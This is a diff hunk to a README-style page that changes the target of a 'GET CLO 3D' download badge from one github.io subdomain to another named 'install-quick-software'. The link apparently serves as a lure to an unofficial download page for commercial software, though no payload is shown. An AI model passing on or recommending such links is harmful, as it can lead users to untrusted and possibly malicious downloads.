@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/clo-3d">  
+<a href="https://install-quick-software.github.io/.github/clo-3d">  
 <img src="https://img.shields.io/badge/💻_GET_CLO_3D-pink?style=for-the-badge&logo=apple" alt="GET CLO 3D">  
 </a>  
 </div>
